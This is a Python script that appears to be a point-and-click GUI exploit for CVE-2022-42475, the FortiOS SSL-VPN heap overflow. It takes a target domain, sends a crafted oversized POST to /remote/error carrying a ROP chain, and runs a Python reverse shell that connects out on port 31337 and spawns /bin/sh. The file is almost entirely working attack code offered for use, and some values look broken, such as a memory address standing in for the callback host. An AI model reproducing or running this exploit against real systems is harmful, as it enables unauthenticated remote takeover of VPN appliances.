import socket
import ssl
from pwn import *
import time
import sys
import requests
import tkinter
from tkinter import *
import tkinter as tk
from tkinter.ttk import *
from time import strftime
from tkinter import ttk
import requests

root = tkinter.Tk()
root.title("CVE_2022_42475_RCE_POC exploits")
root.geometry('600x400+0+0')
def printInput():
    inp = inputtxt.get(1.0, "end-1c")
    lbl.config(text = "attack domin : "+inp)
    url = inp
    scroll_y = Scrollbar(root, orient=VERTICAL)
    txtarea = Text(root, yscrollcommand=scroll_y.set, font=(
            "times new roman", 15, "bold"), fg="#3206b8")
    scroll_y.pack(side=RIGHT, fill=Y)
    scroll_y.config(command=txtarea.yview)
    txtarea.pack(fill=BOTH, expand=1)
    context = ssl.SSLContext()
    target_host = inp
    target_port = '443'
    reverse = '00007fc5f128e000'
    params = 'id'
    strparams = "["
    for param in params:
        strparams += "'"+param+"',"
    strparams = strparams[:-1]
    strparams += "]"


#binary functions
    execve = p64(0x0042e050)

#binary gadgets
    movrdirax = p64(0x00000000019d2196)# : mov rdi, rax ; call r13
    poprsi = p64(0x000000000042f0f8)# : pop rsi ; ret)
    poprdx = p64(0x000000000042f4a5)# : pop rdx ; ret)
    jmprax = p64(0x0000000000433181)#: jmp rax)
    pops = p64(0x000000000165cfd7)# : pop rdx ; pop rbx ; pop r12 ; pop r13 ; pop rbp ; ret)
    poprax = p64(0x00000000004359af)# : pop rax ; ret)
    gadget1 = p64(0x0000000001697e0d); #0x0000000001697e0d : push rbx ; sbb byte ptr [rbx + 0x41], bl ; pop rsp ; pop rbp ; ret
    poprdi = p64(0x000000000042ed7e)# : pop rdi ; ret
    rax3 = gadget1



#hardcoded value which would probably need to be bruteforced or leaked
    hardcoded = 0x00007fc5f128e000

    scbase = p64(hardcoded)
    rdi = p64(hardcoded + 0xc48)
    cmd = p64(hardcoded + 0xd38)
    asdf = hardcoded + 0xd38
    cmd1 = p64(asdf)
    cmd2 = p64(asdf+16)
    arg1 = p64(asdf+48)
    arg2 = p64(asdf+56)
    arg3 = p64(asdf+64)

    ropchain = poprax
    ropchain += execve
    ropchain += poprdi
    ropchain += cmd1
    ropchain += poprsi
    ropchain += cmd2
    ropchain += poprdx
    ropchain += p64(0)
    ropchain += jmprax
    ropchain += b"/bin/python\x00\x00\x00\x00\x00"
    ropchain += arg1
    ropchain += arg2
    ropchain += arg3
    ropchain += p64(0)
    ropchain += b"python\x00\x00"
    ropchain += b"-c\x00\x00\x00\x00\x00\x00"
    ropchain += b"""import socket,sys,os\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.connect(('"""+ reverse.encode() + b"""',31337))\n[os.dup2(s.fileno(),x) for x in range(3)]\ni=os.fork()\nif i==0:\n os.execve('/bin/sh', """+strparams.encode()+b""",{})\n\x00\x00"""



    try:
        with socket.create_connection((target_host, int(target_port,10))) as sock:
            with context.wrap_socket(sock, server_hostname=target_host) as ssock:
                ssock.settimeout(2)
                context.verify_mode = ssl.CERT_NONE
                payload = b"A"*173096+rdi+poprdi+cmd+pops+b"A"*40+pops+rax3+b"C"*32+ropchain
                tosend = b"POST /remote/error HTTP/1.1\r\nHost: "+target_host +b"\r\nContent-Length: 115964117980\r\n\r\n" + payload
                ssock.sendall(tosend)
                r = ssock.recv(10024)
                txtarea.insert(END, r)
    
    except Exception as e:
        txtarea.insert(END, "Exception occurred :"+ repr(e))
        #print("Exception occurred :"+ repr(e))
Hacher = Label(root, text="A heap-based buffer overflow vulnerability [CWE-122] in FortiOS SSL-VPN 7.2.0 through \n7.2.2, 7.0.0 through 7.0.8, 6.4.0 through 6.4.10, 6.2.0 through 6.2.11, 6.0.15 and \nearlier and FortiProxy SSL-VPN 7.2.0 through 7.2.1, 7.0.7 and earlier may allow a remote\n unauthenticated attacker to execute arbitrary code or \ncommands via specifically crafted requests.").pack()  
Hacher = Label(root, text="Enter domin www.example.com : ").pack()
inputtxt = tk.Text(root,height = 1,width = 80)
inputtxt.pack()
printButton = tk.Button(root,text = "exploit", command = printInput)
printButton.pack()
lbl = tk.Label(root, text = "")
lbl.pack()
root.mainloop()